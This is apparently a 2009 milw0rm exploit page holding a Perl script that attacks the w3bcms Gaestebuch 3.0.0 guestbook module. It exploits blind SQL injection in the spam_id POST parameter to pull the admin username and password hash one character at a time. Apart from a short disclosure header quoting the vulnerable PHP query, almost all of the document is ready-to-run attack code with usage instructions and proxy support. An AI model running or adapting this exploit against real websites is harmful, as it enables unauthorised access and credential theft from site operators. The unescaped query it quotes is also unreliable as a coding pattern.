<html><head><title>w3bcms Gaestebuch 3.0.0 Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use Getopt::Long;

#                           \#'#/
#                           (-.-)
#    ------------------oOO---(_)---OOo-----------------
#    |          __             __                     |
#    |    _____/ /_____ ______/ /_  __  ______ ______ |
#    |   / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/ |
#    |  (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )  |
#    | /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/   |
#    | Security Research Division      /____/ 2oo9    |
#    --------------------------------------------------
#    |  w3bcms Gaestebuch v3.0.0 Blind SQL Injection  |
#    |       (requires magic_quotes_gpc = Off)        |
#    --------------------------------------------------
# [!] Discovered.: DNX
# [!] Vendor.....: http://www.w3bcms.de
# [!] Detected...: 26.03.2009
# [!] Reported...: 29.03.2009
# [!] Response...: xx.xx.2009
#
# [!] Background.: CMS features in the frontend:
#                  » Ausgabe angelegter Seiten
#                  » Integrierter sicherer Spamschutz (kein Captcha!)
#                  » CMS Features wie Slogan Rotation, Datumausgabe, Seitenanzeige
#                  » Integrierter Besuchercounter (versteckt/sichtbar)
#               &lt;b&gt;» Sicherheit gegen Hackangriffe&lt;/b&gt;
#                  » Schnelle Datenbankabfragen
#                  » 100% Suchmaschinenoptimiert (SEO)
#                  » Erweiterbar durch Module &amp; Addons
#                  » Unterstützt Mod Rewrite URL's (optional)
#
# [!] Bug........: $_POST['spam_id'] in includes/module/book/index.inc.php near line 42
#
#                  37: } else if (isset($_GET['action']) &amp;&amp; $_GET['action'] == &quot;eintragen&quot; &amp;&amp; $modul_settings['aktiv'] == &quot;0&quot;) {
#                  38:
#                  39:         $_POST['spamschutz'] = mysql_real_escape_string($_POST['spamschutz']);
#                  40:         $_POST['spamschutz'] = strtolower($_POST['spamschutz']);
#                  41:
#                  42:         $data = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM spamschutz WHERE id='&quot;.$_POST['spam_id'].&quot;' AND antwort='&quot;.$_POST['spamschutz'].&quot;'&quot;));
#
# [!] Solution...: no response from vendor but the vendor has updated the module package
#

if(!$ARGV[2])
{
  print &quot;\n                        \\#'#/                     &quot;;
  print &quot;\n                        (-.-)                      &quot;;
  print &quot;\n   ----------------oOO---(_)---OOo-----------------&quot;;
  print &quot;\n   | w3bcms Gaestebuch v3.0.0 Blind SQL Injection |&quot;;
  print &quot;\n   |                coded by DNX                  |&quot;;
  print &quot;\n   ------------------------------------------------&quot;;
  print &quot;\n[!] Usage: perl w3bcms.pl [Target] &lt;Options&gt;&quot;;
  print &quot;\n[!] Example: perl w3bcms.pl -2 -u \&quot;http://127.0.0.1/w3b/index.php?seite=2.gaestebuch\&quot;&quot;;
  print &quot;\n[!] Targets:&quot;;
  print &quot;\n       -1              Get admin username&quot;;
  print &quot;\n       -2              Get admin password hash&quot;;
  print &quot;\n[!] Options:&quot;;
  print &quot;\n       -u [url]        URL to vuln website&quot;;
  print &quot;\n       -p [ip:port]    Proxy support&quot;;
  print &quot;\n&quot;;
  exit;
}

my %options = ();
GetOptions(\%options, &quot;1&quot;, &quot;2&quot;, &quot;u=s&quot;, &quot;p=s&quot;);
my $ua      = LWP::UserAgent-&gt;new();
my $target  = $options{&quot;u&quot;}.&quot;&amp;action=eintragen&quot;;

if($options{&quot;p&quot;})
{
  $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
}

print &quot;[!] Exploiting...\n&quot;;

check_bug($target);

if($options{&quot;1&quot;}) { get_username($target); }
elsif($options{&quot;2&quot;}) { get_password($target); }

print &quot;\n[!] Exploit done\n&quot;;

sub check_bug
{
  my $url = shift;
  syswrite(STDOUT, &quot;[!] Checking bug @ website: &quot; , 28);
  my $inj = &quot;' or 1=1/*&quot;;
  my $req = POST $url, [spam_id =&gt; $inj];
  
  my $res = $ua-&gt;request($req);
  if($res-&gt;content =~ /Bitte geben Sie Ihren Namen an/)
  {
    syswrite(STDOUT, &quot;vuln&quot;, 4);
    print &quot;\n&quot;;
  }
  else
  {
    syswrite(STDOUT, &quot;not vuln&quot;, 8);
    exit;
  }
}

sub get_username
{
  my $target = shift;
  syswrite(STDOUT, &quot;[!] Get username: &quot;, 18);
  for(my $i = 1; $i &lt;= 32; $i++)
  {
    my $found = 0;
    my $h = 32;
    while(!$found &amp;&amp; $h &lt;= 126)
    {
      if(exploit($target, $i, $h, &quot;benutzername&quot;))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }  
}

sub get_password
{
  my $target = shift;
  syswrite(STDOUT, &quot;[!] Get Hash: &quot;, 14);
  for(my $i = 1; $i &lt;= 32; $i++)
  {
    my $found = 0;
    my $h = 48;
    while(!$found &amp;&amp; ($h &lt;= 57 || $h &lt;= 102))
    {
      if(exploit($target, $i, $h, &quot;passwort&quot;))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      if($h == 57)
      {
        $h = 97;
      }
      else
      {
        $h++;
      }
    }
  }
}

sub exploit
{
  my $url = shift;
  my $i   = shift;
  my $h   = shift;
  my $c   = shift;
  my $inj = &quot;' or 1=1 and substring((select &quot;.$c.&quot; FROM admin limit 1),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
  my $req = POST $url, [spam_id =&gt; $inj];
  
  my $res = $ua-&gt;request($req);
  if($res-&gt;content =~ /Bitte geben Sie Ihren Namen an/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}

# milw0rm.com [2009-04-10]</pre></html>